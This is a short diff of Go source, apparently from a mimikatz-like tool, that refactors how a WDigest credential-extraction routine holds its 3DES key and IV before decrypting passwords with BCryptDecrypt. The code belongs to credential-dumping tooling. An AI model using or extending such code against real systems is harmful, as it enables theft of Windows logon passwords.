@@ -233,10 +233,11 @@ func (kiwi *Kiwi) getWdigestList(pHandle windows.Handle, logonID windows.LUID) (
 		pwd := make([]byte, len(data))
 
 		// iv will be changed, so we need copy
+		// TODO call function
 		iv := make([]byte, 8)
-		copy(iv, kiwi.iv[:8])
+		copy(iv, kiwi.lsaNT6.iv[:8])
 
-		api.BCryptDecrypt(kiwi.key3DES, data, 0, iv, pwd)
+		api.BCryptDecrypt(kiwi.lsaNT6.key3DES, data, 0, iv, pwd)
 
 		var utf16Str []uint16
 		sh := (*reflect.SliceHeader)(unsafe.Pointer(&utf16Str))
